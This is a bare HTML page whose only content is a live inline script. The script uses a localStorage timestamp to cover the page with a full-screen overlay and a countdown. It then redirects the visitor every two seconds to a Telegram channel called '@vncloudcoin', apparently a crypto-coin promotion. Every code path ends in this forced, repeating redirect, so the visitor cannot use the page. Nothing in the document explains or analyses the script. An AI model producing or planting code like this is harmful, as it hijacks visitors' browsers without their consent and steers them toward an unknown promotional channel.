<body></body>
<script>
if (localStorage.getItem('lastAccessTime')) {
    var lastAccessTime = parseInt(localStorage.getItem('lastAccessTime'));
    var currentTime = Math.floor(Date.now() / 1000);
    var timeDifference = currentTime - lastAccessTime;
    if (timeDifference > 1800) {
        setInterval(function() { location.href = "https://web.telegram.org/k/#@vncloudcoin" }, 2000);
    }
    if (timeDifference < 3700) {
        var countdown = 3700 - timeDifference;
        const elscreen = document.createElement("div");
        elscreen.style.cssText =
            "position: fixed;inset: 0px;background: #fff;z-index: 20000;display: flex;justify-content: center;align-items: center;font-size: 150pt;color: #000;"
        elscreen.innerHTML = "Loading..."
        document.body.appendChild(elscreen)
        var countdownTimer = setInterval(function() {
            countdown--;
            elscreen.innerHTML = countdown,
                elscreen.style.background = "rgb(236 213 206)";
            elscreen.setAttribute("id", "vncloud")
            if (countdown <= 0) {
                clearInterval(countdownTimer);
                var currentTime = Math.floor(Date.now() / 1000);
                localStorage.setItem('lastAccessTime', currentTime.toString());
                location.href = "https://web.telegram.org/k/#@vncloudcoin"
            }
        }, 1000);
    } else {
        localStorage.setItem('lastAccessTime', currentTime.toString());
        setInterval(function() { location.href = "https://web.telegram.org/k/#@vncloudcoin" }, 2000);
    }
} else {
    var currentTime = Math.floor(Date.now() / 1000);
    localStorage.setItem('lastAccessTime', currentTime.toString());
    setInterval(function() { location.href = "https://web.telegram.org/k/#@vncloudcoin" }, 2000);
}
</script>
